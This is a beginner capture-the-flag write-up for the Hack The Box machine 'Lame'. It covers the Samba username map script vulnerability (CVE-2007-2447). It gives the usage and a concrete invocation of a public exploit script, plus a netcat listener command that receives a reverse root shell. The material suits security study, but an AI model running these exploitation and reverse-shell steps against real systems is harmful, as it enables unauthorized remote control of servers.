Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.

Here we can see that there is no http or https open ports so we can check out the services versions we can see in the nmap scan.

After going through services and googling we can see that there is known Samba vulnerability:

https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2007-2447

After a research about this vulnerability we could learn this:

To exploit this vulnerability, we would send a specially crafted request to the Samba server, taking advantage of the username map script feature. By doing so, we can execute arbitrary code with the privileges of the Samba server process, potentially gaining control over the server.

On Github we can find the exploit for this exact CVE and usage guide:

# Exploitation

Now we are gonna install this exploit and use it against our target!

We can see our IP address by running ``ifconfig`` 

![[Pasted image 20230915145611.png]]


```python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>```

- `RHOST` -- The target address
- `RPORT` -- The target port (TCP : 139)
- `LHOST` -- The listen address
- `LPORT` -- The listen port

Which means mine command should look like this:

`python usermap_script.py 10.10.10.3 139 10.10.14.5 1234`

**Before running the exploit we should run Netcat listener like this:**

`nc -lvnp 1234`

After running the exploit we get the shell as the root!
